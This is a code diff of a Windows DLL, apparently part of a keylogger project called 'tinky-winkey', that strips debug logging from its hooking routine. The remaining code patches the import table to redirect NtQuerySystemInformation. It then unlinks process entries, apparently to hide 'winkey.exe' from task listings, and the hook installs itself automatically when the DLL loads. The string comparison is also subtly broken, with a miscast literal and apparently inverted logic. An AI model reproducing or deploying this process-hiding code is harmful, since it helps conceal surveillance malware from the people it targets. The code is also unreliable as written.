@@ -20,7 +20,7 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
             sysProcInfoNext = (PSYSTEM_PROCESS_INFORMATION_HK)((PUCHAR)sysProcInfoCurr + sysProcInfoCurr->NextEntryOffset);
             if (wcscmp(sysProcInfoNext->ImageName.Buffer, (PWSTR)"winkey.exe"))
             {
-                Mylog(sysProcInfoNext->ImageName.Buffer, 1, TRUE);
+                
                 if (sysProcInfoNext->NextEntryOffset == 0) sysProcInfoCurr->NextEntryOffset = 0;
                 else sysProcInfoCurr->NextEntryOffset += sysProcInfoNext->NextEntryOffset;
             }
@@ -29,25 +29,9 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
     return status;
 }
 
-VOID Mylog(void *toMyLog, int MODE, BOOL putDate)
-{
-    FILE *f = fopen("C:\\Users\\Administrateur\\Documents\\tinky-winkey\\test.log", "a+");
-    if (putDate)
-    {
-        SYSTEMTIME lt;    
-        GetLocalTime(&lt);
-        fprintf(f, "\n[Throw dll injection][%02d/%02d/%d %02d:%02d:%02d]", lt.wDay, lt.wMonth, lt.wYear, lt.wHour, lt.wMinute, lt.wSecond);
-    }
-    if (!MODE) fprintf(f, "[Str][%s]\n", (char *)toMyLog);
-    else if (MODE == 1) fprintf(f, "[WildStr][%ws]\n", (WCHAR *)toMyLog);
-    else fprintf(f, "[Digit][%d]\n", *((int*)toMyLog));
-    fclose(f);
-}
-
 //https://www.youtube.com/watch?v=uS22dBJpr7U
 void StartHook()
 {
-    Mylog("Inside StartHook function.",0, TRUE);
     MODULEINFO moduleInfo = {0};
     HMODULE hModule= GetModuleHandle(NULL);//charge le module courant quand LPCSTR == 0 => Si ce paramètre est NULL, GetModuleHandle retourne un handle au fichier utilisé pour créer le processus appelant (fichier.exe).
     GetModuleInformation(GetCurrentProcess(), hModule, &moduleInfo, sizeof(moduleInfo));
@@ -60,11 +44,7 @@ void StartHook()
     for (; pImgImpDesc->Characteristics; pImgImpDesc++)
     {
         if (strcmp("ntdll.dll", (char *)(baseAddr + pImgImpDesc->Name)) == 0)//Name is an offset
-        {
-            Mylog("Found ntdll.dll", 0, TRUE);
             break;
-        }
-
     }
     PIMAGE_THUNK_DATA pImgThData = (PIMAGE_THUNK_DATA)(baseAddr + pImgImpDesc->OriginalFirstThunk);
     PIMAGE_THUNK_DATA pImgFirstThData = (PIMAGE_THUNK_DATA)(baseAddr + pImgImpDesc->FirstThunk);
@@ -73,10 +53,7 @@ void StartHook()
     {
         pImgImpByName = (PIMAGE_IMPORT_BY_NAME)(baseAddr + pImgThData->u1.AddressOfData);
         if (strcmp("NtQuerySystemInformation", (char *)pImgImpByName->Name) == 0)
-        {
-            Mylog("Found NtQuerySystemInformation in IAT", 0, TRUE);
             break;
-        }
         pImgFirstThData++;
     }
     DWORD dwOld = 0;
@@ -84,22 +61,21 @@ void StartHook()
     pImgFirstThData->u1.Function = (ULONGLONG)HookedNtQuerySystemInformation;
     VirtualProtect((PVOID)&(pImgFirstThData->u1.Function), sizeof(dwOld), dwOld, NULL);
     CloseHandle(hModule);
-    log("StartHook seems to have worked.", 0, TRUE);
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
     switch (ul_reason_for_call)
     {
-    case DLL_PROCESS_ATTACH:
-        Mylog("DLL_PROCESS_ATTACH", 0, TRUE);
-        OrigNtQuerySystemInformation  = (NtQuerySystemInformationHk)GetProcAddress(GetModuleHandleA("ntdll"), "NtQuerySystemInformation");
-        StartHook();
-        break;
-    case DLL_PROCESS_DETACH:
-        Mylog("DLL_PROCESS_DETACH", 0, TRUE);
-        break;
-    default:
-        break;
+        case DLL_PROCESS_ATTACH:
+            
+            OrigNtQuerySystemInformation  = (NtQuerySystemInformationHk)GetProcAddress(GetModuleHandleA("ntdll"), "NtQuerySystemInformation");
+            StartHook();
+            break;
+        case DLL_PROCESS_DETACH:
+            
+            break;
+        default:
+            break;
     }
     return TRUE;
 }
